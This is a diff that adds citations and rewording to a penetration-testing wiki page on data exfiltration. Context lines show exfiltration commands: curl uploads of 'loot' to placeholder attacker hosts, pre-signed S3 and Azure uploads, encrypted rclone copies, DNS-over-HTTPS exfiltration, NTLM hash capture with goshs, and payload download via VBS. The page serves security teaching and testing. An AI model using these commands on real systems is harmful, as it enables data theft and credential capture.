@@ -135,11 +135,11 @@ curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
 curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
 ```
 
-A 2025 research paper (QUIC-Exfil) showed that QUIC features such as encrypted headers and connection migration can make firewall-level detection of exfiltration harder than classic TLS or DNS-based channels, so expect this space to become more relevant as HTTP/3 support spreads.<sup>[[9]](#references)</sup>
+A 2025 research paper (QUIC-Exfil) found that QUIC's encrypted headers and dynamic address changes can make firewall-level detection of exfiltration harder than TLS- or DNS-based channels, and demonstrated a server-preferred-address method that disguises exfiltration as server-side connection migration.<sup>[[9]](#references)</sup>
 
 ### Pre-signed / delegated object-storage uploads
 
-When you can mint or obtain a short-lived **signed URL**, the victim only needs a normal HTTPS client. This avoids installing cloud SDKs or long-lived credentials on the host and blends into common object-storage traffic.
+When you can mint or obtain a short-lived **signed URL**, the victim only needs a normal HTTPS client. This avoids installing cloud SDKs or long-lived credentials on the host.<sup>[[8]](#references)</sup> It can also blend into common object-storage traffic.
 
 **Linux / macOS (AWS S3 pre-signed `PUT`)**
 
@@ -167,15 +167,14 @@ curl -X PUT --data-binary @loot.7z \
 ```
 
 Notes:
-- Pre-signed URLs / SAS tokens usually scope the **path**, **HTTP method**, and **expiration**.
-- For Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` is mandatory.
+- Pre-signed URLs / SAS tokens usually scope the **path**, **HTTP method**, and **expiration**.<sup>[[8]](#references)[[10]](#references)</sup>
+- For Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` is mandatory.<sup>[[10]](#references)</sup>
 - This pattern works well with `curl`, `Invoke-WebRequest`, or any custom implant that can issue a raw HTTPS `PUT`.
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server` 
-with upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, 
-and OOB collaboration features (DNS, SMTP, NTLM hash capture).
+[goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server`.<sup>[[4]](#references)</sup>
+It supports upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, and OOB collaboration features (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
 
 ```bash
 # Serve current directory on port 8000
@@ -287,7 +286,7 @@ while ($true) {
 
 Notes:
 - Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
-- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:
+- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see the related page below.<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -318,9 +317,9 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 ```
 
 Notes:
-- `crypt` can encrypt both file contents and names.
-- `chunker` transparently splits large files and reassembles them on download.
-- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection. For short-lived operations, prefer a dedicated temporary config and remove it afterwards. If you must keep it longer, prefer encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) over leaving a bare `rclone.conf` on disk.
+- `crypt` can encrypt both file contents and names.<sup>[[3]](#references)</sup>
+- `chunker` transparently splits large files and reassembles them on download.<sup>[[11]](#references)</sup>
+- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection.<sup>[[3]](#references)</sup> For short-lived operations, prefer a dedicated temporary config and remove it afterwards. If you must keep it longer, prefer encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) over leaving a bare `rclone.conf` on disk.<sup>[[11]](#references)</sup>
 - If the target already syncs **OneDrive**, **Google Drive**, or **Dropbox**, copying loot into the synchronized directory can piggyback on an already-approved client instead of dropping a new transfer binary.
 
 {{#ref}}
@@ -415,8 +414,7 @@ WindPS-2> cd new_disk:
 ```
 
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) is a single-binary alternative 
-that serves files over SMB and captures NetNTLMv2 hashes from connecting clients:
+[goshs](https://github.com/patrickhener/goshs) is a single-binary alternative that serves files over SMB and captures NTLM hashes from connecting clients.<sup>[[4]](#references)</sup>
 
 ```bash
 # Start SMB server with NTLM hash capture
@@ -506,7 +504,7 @@ base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
   done
 ```
 
-On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.
+On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.<sup>[[2]](#references)</sup>
 
 For full bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, etc.), check [the tunneling page](tunneling-and-port-forwarding.md).
 
@@ -520,8 +518,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) can spin up a quick SMTP server
-to catch email callbacks during OOB exfiltration scenarios:
+[goshs](https://github.com/patrickhener/goshs) can spin up a quick SMTP server to catch email callbacks during OOB exfiltration scenarios.<sup>[[4]](#references)</sup>
 
 ```bash
 # Start SMTP callback server
@@ -612,7 +609,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
+The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.<sup>[[1]](#references)</sup>
 
 ```bash
 # Reduce the size
@@ -633,5 +630,7 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 - [7] [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 - [8] [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
 - [9] [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
+- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
+- [11] [Rclone documentation](https://rclone.org/docs/#configuration-encryption)
 
 {{#include ../banners/hacktricks-training.md}}
